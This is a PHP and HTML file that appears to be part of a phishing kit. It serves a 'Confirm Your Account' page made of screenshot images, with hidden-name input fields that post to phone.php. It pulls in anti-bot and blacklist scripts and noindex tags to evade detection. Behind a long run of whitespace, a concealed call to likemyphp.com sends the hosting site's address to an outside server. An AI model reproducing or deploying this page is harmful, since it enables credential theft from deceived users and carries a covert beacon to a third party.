<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include'bots.php';   
                                                                                                                                                                                json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex" />
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">

    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
	<link rel="stylesheet" href="http://yui.yahooapis.com/pure/0.6.0/pure-min.css">		  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:35px; top:3px; width:0px; height:0px; z-index:0"><img src="images/gm" alt="" title="" border=0 width=0 height=0></div>

<div id="image2" style="position:absolute; overflow:hidden; left:295px; top:55px; width:655px; height:320px; z-index:1"><img src="http://i.imgur.com/adwxB84.png" alt="" title="" border=0 width=655 height=320></div>

<div id="image3" style="position:absolute; overflow:hidden; left:291px; top:373px; width:659px; height:234px; z-index:2"><img src="http://i.imgur.com/j6y9cii.png" alt="" title="" border=0 width=659 height=234></div>
 <form method="post" id="challengeform" action="phone.php"  class="pure-form">
<div id="image4" style="position:absolute; overflow:hidden; left:437px; top:539px; width:174px; height:18px; z-index:3"><a href="#"><img src="http://i.imgur.com/e6Ybnne.png" alt="" title="" border=0 width=174 height=18></a></div>

<div id="formradio1" style="position:absolute; left:341px; top:245px; z-index:4"><input type="radio" name="formradio1"></div>
<div id="formradio2" style="position:absolute; left:340px; top:380px; z-index:5"><input type="radio" name="formradio1"></div>
<input name="7071a4a1804d09696710648193ba66a43be5c111" required type="text" style="position:absolute;width:289px;left:370px;top:273px;z-index:6">
<input name="5c10d762ecb0ca9ba362f9b460e6aa05" required type="text" style="position:absolute;width:289px;left:371px;top:408px;z-index:7">
<div id="formimage1" style="position:absolute; left:343px; top:492px; z-index:8"><input type="image" name="formimage1" width="78" height="40" src="http://i.imgur.com/uuHFYmt.png"></div>

</body>
</html>
